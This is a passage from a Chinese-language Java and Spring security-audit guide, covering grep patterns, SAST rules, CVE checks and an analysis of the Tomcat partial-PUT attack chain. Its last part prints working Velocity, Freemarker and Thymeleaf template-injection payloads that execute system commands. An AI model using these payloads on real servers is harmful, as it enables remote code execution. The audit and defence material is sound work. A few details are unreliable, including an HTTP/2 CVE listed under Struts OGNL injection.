vs.findValue(userInput);  // 历史 Struts2 RCE 来源

// ❌ struts.xml 动态配置
<result name="success">${redirectUrl}</result>  // OGNL 注入
```

**Struts2 OGNL 注入时间线（部分）：**

| CVE | 年份 | 描述 |
|-----|------|------|
| CVE-2013-2251 | 2013 | Action 名称注入 |
| CVE-2017-5638 | 2017 | Content-Type 头注入 |
| CVE-2018-11776 | 2018 | 命名空间注入 |
| CVE-2023-44487 | 2023 | HTTP/2 Rapid Reset（影响面扩大） |

**审计 grep（表达式注入统一扫描）：**

```bash
# SpEL
grep -rn 'SpelExpressionParser\|parseExpression\|StandardEvaluationContext\|@Value.*#{' --include='*.java' .

# EL
grep -rn 'ELProcessor\|ValueExpression\|createValueExpression\|ExpressionFactory' --include='*.java' .

# OGNL
grep -rn 'Ognl.getValue\|Ognl.parseExpression\|findValue\|ValueStack' --include='*.java' .

# Thymeleaf 预处理
grep -rn '__\$\|th:text.*__\|th:utext.*__' --include='*.html' .
```

### 18. 安全编码更新

#### 18.1 安全随机数生成

```java
// ❌ 不安全随机数（可预测）
Random random = new Random();     // 线性同余，可预测
String token = String.valueOf(random.nextInt());

// ❌ java.util.Random 在安全场景中的误用
UUID.randomUUID();  // 内部使用 SecureRandom，安全

// ✅ 安全随机数
SecureRandom sr = SecureRandom.getInstanceStrong();  // JDK 9+
byte[] salt = new byte[32];
sr.nextBytes(salt);

// ✅ 密码学安全 Token 生成
import org.apache.commons.lang3.RandomStringUtils;
// 或使用 Java 11+ 的方案
SecureRandom sr = new SecureRandom();
byte[] token = new byte[32];
sr.nextBytes(token);
String hexToken = HexFormat.of().formatHex(token);
```

#### 18.2 PreparedStatement 深度使用

```java
// ✅ 标准参数化查询
try (PreparedStatement ps = conn.prepareStatement(
        "SELECT id, name FROM users WHERE email = ? AND status = ?")) {
    ps.setString(1, email);
    ps.setString(2, status);
    ResultSet rs = ps.executeQuery();
}

// ✅ 动态 ORDER BY / 表名（不能用参数化时）
// 白名单映射
private static final Map<String, String> SORT_COLUMNS = Map.of(
    "name", "u.name",
    "date", "u.created_at",
    "email", "u.email"
);

private String getSortColumn(String input) {
    return SORT_COLUMNS.getOrDefault(input, "u.id");  // 默认值
}

// ✅ IN 子句安全处理
// 使用 Spring Data JPA 的 @Param + :ids
@Query("SELECT u FROM User u WHERE u.id IN :ids")
List<User> findByIds(@Param("ids") List<Long> ids);
```

#### 18.3 密码存储与密钥管理

```java
// ❌ 不安全密码存储
String hashed = MD5(password);           // 已破解
String hashed = SHA1(password);          // 已破解
String hashed = SHA256(password + salt); // 快速哈希，暴力破解可行

// ✅ 安全密码存储（Argon2 / BCrypt）
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.crypto.argon2.Argon2PasswordEncoder;

@Bean
public PasswordEncoder passwordEncoder() {
    // Argon2 — 2025 推荐（OWASP）
    return new Argon2PasswordEncoder(
        16,     // saltLength
        32,     // hashLength
        4,      // parallelism
        65536,  // memory (64MB)
        3       // iterations
    );
}

// ✅ 密钥管理 — 使用 Vault / AWS KMS / Azure Key Vault
// 配合 Spring Cloud Vault
@Value("${vault.secret.db-password}")
private String dbPassword;
```

#### 18.4 HTTP 安全头完整配置

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(h -> h
        // HSTS — 强制 HTTPS
        .httpStrictTransportSecurity(hsts -> hsts
            .includeSubDomains(true)
            .preload(true)
            .maxAgeInSeconds(63072000)  // 2年
        )
        // CSP — 内容安全策略
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; "
                + "script-src 'self' 'nonce-{nonce}'; "
                + "style-src 'self' 'unsafe-inline'; "
                + "img-src 'self' data: https:; "
                + "frame-ancestors 'none'; "
                + "base-uri 'self'; "
                + "form-action 'self'")
        )
        // 其他安全头
        .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
        .xssProtection(xss -> xss.headerValue(
            XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
        .referrerPolicy(ref -> ref.policy(
            ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
        .permissionsPolicy(pp -> pp.policy(
            "camera=(), microphone=(), geolocation=(), payment=()"))
    );
    return http.build();
}
```

### 19. 安全审计工具更新

#### 19.1 Semgrep Java 规则（2025 增强版）

```yaml
# semgrep-java-security.yml — 2025 增强规则集
rules:
  # ---- 反序列化 ----
  - id: java-deserialization-objectinputstream
    pattern: new ObjectInputStream($INPUT);
    message: "不安全的 Java 原生反序列化入口，可能导致 RCE"
    severity: ERROR
    languages: [java]
    metadata:
      cwe: CWE-502
      owasp: A8:2017-Deserialization
      references:
        - https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data

  - id: java-fastjson-autotype
    patterns:
      - pattern: JSON.parseObject($INPUT);
      - pattern-not-inside: |
          ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
          ...
    message: "Fastjson autoType 默认行为可能导致 RCE"
    severity: ERROR
    languages: [java]

  # ---- Spring Security ----
  - id: java-spring-actuator-expose-all
    patterns:
      - pattern: |
          management:
            endpoints:
              web:
                exposure:
                  include: "*"
    message: "Spring Actuator 所有端点暴露，可能导致敏感信息泄露"
    severity: ERROR
    languages: [yaml]

  - id: java-spring4shell-bean-binding
    patterns:
      - pattern: |
          @PostMapping(...)
          public $TYPE $METHOD($BEAN $param) { ... }
      - pattern-not-inside: |
          @InitBinder
          ...
    message: "Bean 参数绑定未禁用 class 属性，可能存在 Spring4Shell 风险"
    severity: WARNING
    languages: [java]

  # ---- 表达式注入 ----
  - id: java-spel-injection
    patterns:
      - pattern: |
          $PARSER.parseExpression($USER_INPUT);
      - pattern-not-inside: |
          ... SimpleEvaluationContext ...
    message: "用户输入进入 SpEL 表达式求值，未使用受限上下文"
    severity: ERROR
    languages: [java]

  - id: java-log4j-jndi-pattern
    patterns:
      - pattern-either:
          - pattern: |
              $LOG.info($USER_INPUT + ...);
          - pattern: |
              $LOG.info(String.format(..., $USER_INPUT));
    message: "用户输入直接进入日志，可能触发 Log4Shell/JNDI 注入"
    severity: WARNING
    languages: [java]

  # ---- 加密安全 ----
  - id: java-weak-random
    pattern: new Random();
    message: "使用 java.util.Random 而非 SecureRandom，随机数可预测"
    severity: WARNING
    languages: [java]

  - id: java-hardcoded-secret
    patterns:
      - pattern: |
          private static final String $VAR = "...";
      - metavariable-regex:
          metavariable: $VAR
          regex: "(?i)(password|secret|api_key|token|credential)"
    message: "硬编码密钥/密码"
    severity: ERROR
    languages: [java]
```

#### 19.2 CodeQL Java 查询

```ql
// 反序列化漏洞检测
/**
 * @name Java unsafe deserialization
 * @kind path-problem
 * @security-severity 9.0
 */
import java

from MethodAccess ma, Expr input
where
  ma.getMethod().hasQualifiedName("java.io.ObjectInputStream", "readObject") and
  input = ma.getQualifier() and
  exists(DataFlow::Node source |
    source instanceof RemoteUserInput and
    DataFlow::localFlow(source, DataFlow::exprNode(input))
  )
select ma, "Unsafe deserialization of user-controlled data"
```

```bash
# CodeQL 扫描命令
codeql database create java-db --language=java --source-root=.
codeql database analyze java-db codeql/java-queries --format=sarif-latest --output=results.sarif
```

#### 19.3 SpotBugs / FindSecBugs 2025 更新

```xml
<!-- spotbugs-security.xml — 增强过滤 -->
<FindBugsFilter>
    <!-- 强制检查的安全规则 -->
    <Match>
        <Bug pattern="SQL_INJECTION_JDBC,SQL_INJECTION_HIBERNATE,SQL_INJECTION_JDO"/>
    </Match>
    <Match>
        <Bug pattern="XXE_DOCUMENT,XXE_SAXPARSER,XXE_XMLREADER,XXE_XSLT"/>
    </Match>
    <Match>
        <Bug pattern="DESERIALIZATION_GADGET,OBJECT_DESERIALIZATION"/>
    </Match>
    <Match>
        <Bug pattern="PATH_TRAVERSAL_IN,PATH_TRAVERSAL_OUT"/>
    </Match>
    <Match>
        <Bug pattern="REDOS,WEAK_MESSAGE_DIGEST_MD5,WEAK_MESSAGE_DIGEST_SHA1"/>
    </Match>
    <Match>
        <Bug pattern="HARD_CODE_PASSWORD,HARD_CODE_KEY"/>
    </Match>
    <Match>
        <Bug pattern="CRLF_INJECTION_LOGS,LDAP_INJECTION"/>
    </Match>
</FindBugsFilter>
```

#### 19.4 工具对比矩阵（2025）

| 工具 | 类型 | 优势 | 局限 | 推荐场景 |
|------|------|------|------|---------|
| **Semgrep** | SAST | 速度快、自定义规则、CI 友好 | 无数据流分析（仅语法匹配） | PR 检查、快速扫描 |
| **CodeQL** | SAST | 精确数据流分析、语义理解 | 速度慢、学习曲线陡 | 深度审计、漏洞赏金 |
| **SpotBugs/FindSecBugs** | 字节码分析 | 无需源码、精确度高 | 需编译、规则更新慢 | CI/CD 门禁 |
| **OWASP dep-check** | SCA | NVD 数据库全、报告详细 | 误报率较高 | 依赖审计 |
| **Trivy** | SCA+容器 | 速度快、支持容器镜像 | 不做代码分析 | 容器安全 |
| **SyntaxFlow** | SAST | Java 专项、中文文档好 | 社区较新 | 中国企业 |

### 20. 更新 MITRE ATT&CK 映射

| 战术 | Technique | Java 相关场景 | 更新说明 |
|------|-----------|-------------|---------|
| Initial Access | T1190 — Exploit Public-Facing App | SQL注入、XXE、反序列化 RCE、Spring4Shell | **新增 Spring4Shell** |
| Execution | T1059 — Command/Scripting Interpreter | SpEL/OGNL/EL 表达式注入、Runtime.exec() | **新增 EL 表达式注入** |
| Execution | T1203 — Exploitation for Client Execution | Log4Shell JNDI 注入 | **新增 Log4Shell** |
| Persistence | T1133 — External Remote Services | JWT 伪造、Spring Actuator 暴露 | **增强 Actuator 利用链** |
| Privilege Escalation | T1068 — Exploitation for Privilege Escalation | 认证绕过、@PreAuthorize 缺失 | — |
| Defense Evasion | T1140 — Deobfuscate/Decode Files | 文件上传 Webshell、ClassLoader 动态加载 | **增强 ClassLoader 滥用** |
| Credential Access | T1212 — Exploitation for Credential Access | SQL注入提取凭证、Actuator /env 泄露密码 | **增强 Actuator 堆转储** |
| Credential Access | T1552 — Unsecured Credentials | 硬编码密钥、日志泄露密钥、heapdump 提取 | **新增 heapdump 攻击** |
| Discovery | T1087 — Account Discovery | Actuator /beans /mappings 端点信息收集 | **新增** |
| Lateral Movement | T1021 — Remote Services | SSRF 内网探测、RMI/JMX 未授权访问 | **增强 RMI/JMX** |
| Command and Control | T1071 — Application Layer Protocol | JNDI/LDAP/RMI 外连、DNS 隧道 | **新增 JNDI 外连** |
| Exfiltration | T1041 — Exfiltration Over C2 Channel | SSRF 数据外泄、Actuator /heapdump 下载 | **增强 heapdump 利用** |
| Impact | T1489 — Service Stop | Log4j 递归查找 DoS (CVE-2021-45105) | **新增** |

### 21. 2025-2026 审计执行检查清单更新

| 步骤 | 动作 | 命令/工具 | 优先级 |
|------|------|----------|--------|
| 1 | 端点发现与路由映射 | `grep -rn '@.*Mapping' --include='*.java' .` | P0 |
| 2 | **Actuator 暴露检测** | `curl -s target/actuator/` + 配置文件审查 | **P0** |
| 3 | 反序列化入口 + Gadget 依赖 | `grep 'readObject\|ObjectInputStream\|JSON.parse'` + pom.xml 审查 | P0 |
| 4 | **Fastjson autoType 检测** | `grep 'fastjson\|@type\|autoType'` | **P0** |
| 5 | **Log4j 版本检测** | `mvn dependency:tree \| grep log4j` | **P0** |
| 6 | **Spring 框架版本** | 检查 Spring Framework < 5.3.18 / < 6.0.0 | **P0** |
| 7 | SQL 注入审计 | `grep 'executeQuery\|createQuery\|nativeQuery\|\${'` | P1 |
| 8 | 表达式注入审计 | `grep 'parseExpression\|Ognl\.\|ELProcessor\|findValue'` | P1 |
| 9 | 认证覆盖验证 | 对比端点列表与 `@PreAuthorize` 覆盖 | P1 |
| 10 | 加密与密钥审计 | `grep 'DES\|MD5\|password.*=\|new Random()'` | P1 |
| 11 | 文件操作审计 | `grep 'File\|Path\|InputStream\|MultipartFile'` | P2 |
| 12 | SAST 自动化扫描 | `semgrep --config p/java --config p/spring .` | P2 |
| 13 | 依赖漏洞扫描 | `mvn dependency-check:check` / Trivy | P2 |
| 14 | CodeQL 深度分析 | `codeql database analyze` | P3 |
| 15 | 密钥泄露扫描 | `grep -rn 'password\|secret\|api_key' --include='*.java' --include='*.properties' --include='*.yml' .` | P2 |

### 22. 2025-2026 Java/Spring 关键 CVE 速查

| CVE | 影响 | CVSS | 类型 | 关键信息 |
|-----|------|------|------|----------|
| **CVE-2025-24813** | Apache Tomcat 9/10/11 | **严重** | 路径等价 + 反序列化 RCE | Partial PUT 功能允许覆盖磁盘上的序列化 session 文件 → RCE。需满足: 默认 servlet 写入启用 + partial PUT 启用 + 使用 FileStore 持久化 session + classpath 中存在反序列化 gadget。披露后 ~30h 即被野外利用。修复: 升级至 9.0.99+/10.1.35+/11.0.3+ |
| **CVE-2026-40976** | Spring Boot 4.0.0–4.0.5 | **严重** | Actuator 端点未授权访问 | Spring Boot 4.0.6 紧急修复 8 个 CVE（1 严重 + 2 高 + 5 中）。修复: 升级至 Spring Boot 4.0.6+ |
| **CVE-2026-22733** | Spring Boot 2.7.0–2.7.32, 3.3.0–3.3.18 | 中 | 认证绕过 | 当认证端点与 Actuator 路径冲突时，认证可被绕过。发生在同时使用 Actuator + Spring Security 且配置不当时。修复: 升级至 2.7.33+/3.3.19+ |
| **CVE-2025-41248** | Spring Security | 高 | 安全框架缺陷 | Spring Security 漏洞，2025-09 披露 |
| **CVE-2025-41249** | Spring Framework | 高 | 框架缺陷 | Spring Framework 6.2.11 修复。5.3.x/6.1.x 开源支持已结束 |
| **CVE-2025-46822** | Spring | 高 | 未授权文件访问 | 允许未授权访问敏感内部文件 |

```bash
# ==================== CVE 快速检查脚本 ====================

echo "=== Apache Tomcat 版本检查 (CVE-2025-24813) ==="
# 检查 pom.xml 中的 Tomcat 版本
grep -rn 'tomcat-embed\|apache.tomcat' pom.xml 2>/dev/null
# 检查是否启用 partial PUT (web.xml)
grep -rn 'readonly.*false\|partial.put' src/ --include="*.xml" 2>/dev/null
# 检查 session 持久化配置
grep -rn 'FileStore\|file-store\|persistent' src/ --include="*.java" --include="*.properties" --include="*.yml" 2>/dev/null

echo "=== Spring Boot 版本检查 ==="
grep -rn 'spring-boot-starter-parent\|spring.boot.version' pom.xml gradle.properties 2>/dev/null
grep -rn 'spring-boot.version' build.gradle 2>/dev/null

echo "=== Spring Boot Actuator 配置检查 (CVE-2026-22733) ==="
grep -rn 'management.endpoints.web.exposure' src/ --include="*.properties" --include="*.yml" 2>/dev/null
grep -rn 'endpoints.default.web.enabled' src/ --include="*.properties" --include="*.yml" 2>/dev/null

echo "=== 反序列化 Gadget 依赖检查 ==="
mvn dependency:tree 2>/dev/null | grep -i 'commons-collections\|commons-beanutils\|spring-beans\|hibernate\|fastjson\|jackson-databind\|xalan\|javassist'
```

### 23. CVE-2025-24813 Apache Tomcat Partial PUT RCE 深度分析

```java
// ==================== CVE-2025-24813 技术分析 ====================
// 漏洞: Apache Tomcat Partial PUT 路径等价 → 反序列化 RCE
// 类型: CWE-44 (路径等价) + CWE-502 (不安全反序列化)
// 影响: Apache Tomcat 9.0.0.M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2
// 披露: 2025-03-10 | 野外利用: ~30h 后即被积极利用

// ==================== 利用条件（四缺一不可）====================
// 1. Default Servlet 启用了写入（默认关闭）
//    web.xml 中: <init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>
// 2. 启用了 Partial PUT（Tomcat 默认支持）
// 3. 应用使用 FileStore 进行 session 持久化（非默认）
//    <Manager className="org.apache.catalina.session.PersistentManager">
//      <Store className="org.apache.catalina.session.FileStore"/>
//    </Manager>
// 4. Classpath 中存在可利用的反序列化 gadget chain

// ==================== 攻击链 ====================
// Step 1: 攻击者通过 Partial PUT 上传恶意序列化数据
//   PUT /target/../../sessions/恶意session文件 HTTP/1.1
//   Content-Range: bytes 0-xxx/yyy
//   [恶意序列化 Java 对象]
//
// Step 2: Tomcat 路径等价缺陷导致文件被写入 session 目录
//
// Step 3: 当应用加载 session 时，反序列化恶意对象
//
// Step 4: Classpath 中的 gadget chain 触发 → RCE

// ==================== 审计要点 ====================
// 1. 检查 web.xml 中 default servlet 的 readonly 配置
grep -rn 'readonly.*false' src/ --include="*.xml"
// 2. 检查 session 持久化配置
grep -rn 'FileStore\|PersistentManager' src/ --include="*.xml" --include="*.java"
// 3. 检查 classpath 中的反序列化 gadget 依赖
mvn dependency:tree | grep -E 'commons-collections|commons-beanutils|javassist|xalan'
// 4. 检查 Tomcat 版本
grep -rn 'tomcat' pom.xml

// ==================== 防御 ====================
// 1. 升级 Tomcat 至安全版本
// 2. 确保默认 servlet readonly=true（默认值）
// 3. 避免使用 FileStore 持久化 session
// 4. 使用 JEP 290 过滤器限制反序列化类
java -Djava.io.ObjectInputFilter='!com.example.dangerous.*' -jar app.jar
// 5. 部署 WAF 规则检测异常 PUT 请求
```

### 24. Java 反序列化 Gadget Chain 研究前沿（2025-2026）

```
Java 反序列化研究前沿（2025-2026）
===================================

1. "Finding Gadgets Like it's 2026" — Atredis Partners (2026-03)
   来源: https://www.atredis.com/blog/2026/3/12/findings-gadgets-like-its-2026
   内容: 现代 Java 环境中发现新 gadget chain 的方法论
   要点:
   - Java 17+ 的模块化限制不是不可绕过的
   - 新的 gadget chain 仍然在常见依赖中被发现
   - 自动化 gadget chain 搜索工具的发展

2. "Sleeping Giants: Activating Dormant Java Deserialization Gadget Chains" — ACM (2024-2025)
   来源: https://dl.acm.org/doi/10.1145/3719027.3765031
   内容: 学术研究证明大量已知 gadget chain 依赖的 gadget 处于"休眠"状态
   要点:
   - 绝大多数已知 gadget chain 依赖软件依赖中的 gadget
   - 微小的代码变更可以"激活"休眠的 gadget chain
   - 意味着即使当前不可利用的依赖也可能在未来变得危险

3. OWASP: "Exploiting Deserialization in Recent Java Versions"
   来源: https://owasp.org/www-chapter-stuttgart/assets/slides/2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf
   要点:
   - Java 17+ 的反序列化限制改变了利用方式
   - JNDI 注入在 Java 21 中受到更多限制但仍可利用
   - 需要新的绕过技术

4. Synacktiv: "Java Deserialization Tricks"
   来源: https://www.synacktiv.com/en/publications/java-deserialization-tricks
   要点:
   - WAF 绕过技术
   - Gadget chain 混淆方法
   - 实战利用技巧

5. Google Cloud TI: "Systematically Hunting for Deserialization Exploits"
   来源: https://cloud.google.com/blog/topics/threat-intelligence/hunting-deserialization-exploits/
   要点:
   - 攻击者持续利用反序列化漏洞
   - 系统化发现方法
```

```bash
# ==================== 反序列化 Gadget Chain 审计自动化 ====================

# 1. 使用 ysoserial 生成 payload (经典工具)
# git clone https://github.com/frohoff/ysoserial.git
# java -jar ysoserial.jar CommonsCollections6 "id" | base64 | wc -c  # 检查 payload 大小

# 2. 使用 JMET (Java Memcached Exploitation Tool) 测试
# git clone https://github.com/frohoff/jmet.git

# 3. 检查项目中的 gadget chain 依赖风险
echo "=== 高风险依赖检查 ==="
mvn dependency:tree 2>/dev/null | grep -E \
  'commons-collections[123]|commons-beanutils|spring-beans|spring-core|'\
'hibernate-core|javassist|xalan|clojure|groovy|'\
'vaadin-server|wicket-util|bsh|c3p0|'\
'fastjson|jackson-databind|xstream|'

# 4. 检查 ObjectInputStream 使用
grep -rn 'ObjectInputStream\|readObject\|readUnshared' src/ --include="*.java"

# 5. 检查 JEP 290 过滤器配置
grep -rn 'ObjectInputFilter\|serialFilter\|ObjectInputFilter.Config' src/ --include="*.java"

# 6. 检查自定义反序列化
grep -rn '@JsonDeserialize\|@JsonCreator\|readValue' src/ --include="*.java"

# 7. Maven 安全插件配置检查
grep -rn 'dependency-check\|spotbugs\|findsecbugs' pom.xml
```

### 25. Java 21 Virtual Threads 安全影响与审计要点

```java
// ==================== Java 21 Virtual Threads 安全审计 ====================
// Spring Boot 3.2+ 支持: spring.threads.virtual.enabled=true
// Spring Boot 4.0 优化: 原生支持 Java 21 虚拟线程

// ==================== 安全影响 ====================

// 1. 线程固定 (Pinning) → 拒绝服务风险
// 当虚拟线程在 synchronized 块内执行阻塞 I/O 操作时
// 会"固定"到载体线程，导致载体线程无法被其他虚拟线程复用
// 攻击场景: 攻击者发送大量慢速请求 → 所有载体线程被固定 → 服务不可用
public class VulnerableEndpoint {
    // ❌ 危险: synchronized 块内的阻塞操作
    public synchronized ResponseEntity<Data> processRequest(String input) {
        // 阻塞 I/O → 固定载体线程
        String result = blockingHttpCall(input);  // 慢速外部调用
        return ResponseEntity.ok(new Data(result));
    }

    // ✅ 安全: 使用 ReentrantLock 替代 synchronized
    private final ReentrantLock lock = new ReentrantLock();
    public ResponseEntity<Data> processRequestSafe(String input) {
        lock.lock();
        try {
            String result = blockingHttpCall(input);
            return ResponseEntity.ok(new Data(result));
        } finally {
            lock.unlock();
        }
    }
}

// 2. ThreadLocal 泄漏放大
// 虚拟线程数量远超平台线程 → ThreadLocal 内存泄漏影响更大
// 审计: 检查 ThreadLocal 使用是否正确清理
grep -rn 'ThreadLocal\|InheritableThreadLocal' src/ --include="*.java"

// 3. 安全上下文传播
// 虚拟线程中 SecurityContext/认证信息可能不正确传播
// 特别是使用 @Async 或自定义线程池时
// 审计: 检查安全上下文在异步操作中的传播
grep -rn '@Async\|CompletableFuture\|ExecutorService' src/ --include="*.java"

// 4. Netflix 报告的锁竞争问题
// 来源: https://netflixtechblog.com/java-21-virtual-threads-dude-wheres-my-lock-3052540e231d
// 锁竞争在虚拟线程下表现不同 → 可能导致意外行为

// ==================== 审计清单 ====================
// □ 检查所有 synchronized 块中是否有阻塞 I/O
//   grep -rn 'synchronized' src/ --include="*.java" -A 5 | grep -E 'wait\|sleep\|read\|write\|connect'
// □ 检查 ThreadLocal 使用是否在 finally 中清理
// □ 检查 @Async 方法中安全上下文是否正确传播
// □ 检查数据库连接池配置是否适配虚拟线程
// □ 检查是否有基于线程数限流的 WAF/Rate Limiter（虚拟线程可能绕过）
```

### 26. Spring Boot 4.0 安全变更（2025-2026）

```
Spring Boot 4.0 安全相关变更
============================

发布时间: 2025-11 (Spring Boot 4.0.x)
基础要求: Java 17+ (推荐 Java 21)
框架版本: Spring Framework 7.0

安全变更:
---------
1. Jakarta EE 11 迁移
   - 所有 javax.* 包迁移至 jakarta.*
   - 安全影响: 自定义安全过滤器可能需要更新 import

2. Actuator 端点安全加固
   - CVE-2026-40976 修复: 更严格的端点访问控制
   - CVE-2026-22733 修复: Actuator 路径与认证冲突解决

3. 虚拟线程原生支持
   - spring.threads.virtual.enabled=true (默认仍为 false)
   - 需要评估虚拟线程对安全上下文传播的影响

4. Observability 安全
   - Micrometer Observation API 增强
   - 确保追踪数据不包含敏感信息

审计迁移检查:
-------------
□ 1. javax.* → jakarta.* 包迁移是否完整
     grep -rn 'import javax\.' src/ --include="*.java" | grep -v 'javax.net.ssl\|javax.sql'

□ 2. 安全配置是否更新至新 API
     grep -rn 'WebSecurityConfigurerAdapter' src/ --include="*.java"
     // Spring Boot 4.0 中已完全移除，必须使用 SecurityFilterChain bean

□ 3. 依赖兼容性
     mvn dependency:tree | grep -i 'javax\|jakarta'

□ 4. 配置属性变更
     grep -rn 'spring.security\|management.endpoints' src/ --include="*.properties" --include="*.yml"
```

### 27. 中文社区精华参考（Java 安全）

```
Java 安全审计 — 中文安全社区精华资源（2025 更新）
=================================================

长亭科技 (Chaitin):
-------------------
- SpringSecurity 权限绕过分析: https://stack.chaitin.com/techblog/detail/203

先知社区 (xz.aliyun.com):
------------------------
- Java 反序列化相关文章: 搜索 "Java反序列化" 获取最新
- ThinkPHP/Java 代码审计实战文章

阿里云漏洞库 (avd.aliyun.com):
------------------------------
- Spring Boot 漏洞跟踪
- Java 反序列化相关 CVE

GitHub 精华:
-----------
- HackJava (Java 安全资源合集): https://github.com/HackJava/HackJava
- java-sec-code (Java 安全代码示例): https://github.com/JoyChou93/java-sec-code
- ysoserial (Java 反序列化利用工具): https://github.com/frohoff/ysoserial
- Java Deserialization Tricks (Synacktiv): https://www.synacktiv.com/en/publications/java-deserialization-tricks

英文研究:
--------
- Atredis "Finding Gadgets Like it's 2026": https://www.atredis.com/blog/2026/3/12/findings-gadgets-like-its-2026
- ACM "Sleeping Giants": https://dl.acm.org/doi/10.1145/3719027.3765031
- OWASP Deserialization in Recent Java: https://owasp.org/www-chapter-stuttgart/assets/slides/2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf
- Google Cloud TI Hunting Deserialization: https://cloud.google.com/blog/topics/threat-intelligence/hunting-deserialization-exploits/
- Netflix Virtual Threads Lock: https://netflixtechblog.com/java-21-virtual-threads-dude-wheres-my-lock-3052540e231d
```

### 28. Java 应用安全防御升级路线图（2025-2026）

```
Java 应用安全防御升级路线图（2025-2026）
========================================

P0 — 立即修复（24 小时内）
──────────────────────────
□ 升级 Apache Tomcat 至安全版本（CVE-2025-24813）
□ 升级 Spring Boot 至安全版本（CVE-2026-40976/22733）
□ 升级 Spring Framework 至 6.2.11+（CVE-2025-41249）
□ 审计 Tomcat 默认 servlet readonly 配置
□ 检查 FileStore session 持久化是否使用

P1 — 高优先级（1 周内）
──────────────────────────
□ 运行 mvn dependency-check:check 扫描已知漏洞
□ 审计所有 ObjectInputStream 使用，考虑 JEP 290 过滤器
□ 检查 classpath 中的反序列化 gadget 依赖
□ 审计 Spring Actuator 端点暴露范围
□ 移除不必要的依赖（减少攻击面）

P2 — 中优先级（1 月内）
──────────────────────────
□ 引入 Semgrep + SpotBugs/FindSecBugs 到 CI/CD
□ 审计所有 @RequestMapping 的安全注解覆盖
□ 检查 Spring Security 配置完整性
□ 评估 Java 21 虚拟线程的安全影响
□ 审计 ThreadLocal 使用和清理
□ 检查异步操作中的安全上下文传播

P3 — 长期改进
──────────────────────────
□ 迁移至 Spring Boot 4.0 + Java 21
□ 全面使用 SecurityFilterChain 替代 WebSecurityConfigurerAdapter
□ 建立 Java 反序列化白名单（JEP 290/ObjectInputFilter）
□ 引入 RASP 保护运行时反序列化
□ 定期使用 ysoserial/gadget-inspector 扫描 gadget chain
□ 建立 Maven/Gradle 安全扫描自动化流水线
```

## Part D：模板引擎注入实战（实战经验补充）

> 来源：codecheck/java-ReadMe.md（一线 Java 代码审计经验，覆盖 Spring Boot 主流模板引擎）
> Thymeleaf 之外，**Freemarker 与 Velocity** 是真实业务中最常被忽视的 RCE 入口。

### 14. Velocity 模板注入（CVE-2020-13936）

```
影响版本：Apache Velocity ≤ 2.2
前提：攻击者可上传/修改 .vm 模板（CMS、邮件模板、报表模板、规则引擎配置）

漏洞机制：
  Velocity 2.2 之前，模板中可调用任意 Java 反射，等同于 Servlet 权限执行任意代码。
  即使是 sandbox 模式，2.2 之前 secureUberspector 仍可被绕过。

利用 Payload（直接写入模板文件）：
  #set($e="e")
  $e.getClass().forName("java.lang.Runtime")
       .getMethod("getRuntime",null)
       .invoke(null,null)
       .exec("calc.exe")

  #set($str=$class.inspect("java.lang.String").type)

绕过 secureuberspector：
  #set($runtime = $esc.class.forName("java.lang.Runtime").getMethod("getRuntime", $null).invoke($null, $null))
  $runtime.exec("id")

审计 Grep：
  grep -rE "VelocityContext|TemplateEngine|mergeTemplate|init\s*\(" --include="*.java"
  find . -name "*.vm" -o -name "*.vsl"      # 模板文件
  grep -rE "VelocityEngine\(\)|velocity\.app" pom.xml build.gradle

修复：
  - 升级 Velocity ≥ 2.3
  - 配置 SecureUberspector：runtime.introspector.uberspect=org.apache.velocity.util.introspection.SecureUberspector
  - 业务侧禁止用户上传 .vm/.vsl 模板
```

### 15. Freemarker 模板注入（class resolver 滥用）

```
核心机制：
  Freemarker 内建函数 new() 和 api() 可实例化任意实现了 TemplateModel 接口的类。
  - new()：2.3.17 后受 TemplateClassResolver 控制，但默认 UNRESTRICTED_RESOLVER 仍可绕过
  - api()：需 api_builtin_enabled=true（2.3.22 后默认 false，但很多老项目仍开启）

危险类（位于 freemarker.template.utility）：
  - Execute         → 直接执行系统命令
  - ObjectConstructor → 实例化任意类（如 ProcessBuilder）
  - JythonRuntime   → 执行 Python 代码

利用 Payload：
  <!-- 1. new() + Execute -->
  <#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

  <!-- 2. new() + ObjectConstructor -->
  <#assign value="freemarker.template.utility.ObjectConstructor"?new()>
  ${value("java.lang.ProcessBuilder","calc.exe").start()}

  <!-- 3. new() + JythonRuntime -->
  <#assign value="freemarker.template.utility.JythonRuntime"?new()>
  <@value>import os;os.system("calc.exe")</@value>

  <!-- 4. api() + ClassLoader 加载恶意类 -->
  <#assign cl=object?api.class.protectionDomain.classLoader>
  ${cl.loadClass("Evil").newInstance()}

审计 Grep：
  find . -name "*.ftl" -o -name "*.ftlh"
  grep -rE "Configuration\(\)|TemplateLoader|setTemplateLoader|process\s*\(" --include="*.java"
  grep -rE "api_builtin_enabled|new_builtin_class_resolver" *.properties *.cfg

修复：
  Configurable.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
  // 或至少 SAFER_RESOLVER（拦截 Execute/ObjectConstructor/JythonRuntime）
  cfg.setAPIBuiltinEnabled(false);
```

### 16. Thymeleaf 模板注入补强

```
已有基础（Part A）：__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

实战补充：
  <!-- 1. URL fragment 注入（最常见） -->
  GET /path?fragment=__${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}__::.x

  <!-- 2. 通过 SecAuditorContext / data-* 属性 -->
  <div th:text="${__${T(java.lang.Runtime).getRuntime().exec('id')}__}">

  <!-- 3. 利用 Spring 表达式方言 -->
  ${T(org.springframework.util.StreamUtils).copyToString(
     T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),
     T(java.nio.charset.Charset).defaultCharset())}

修复：
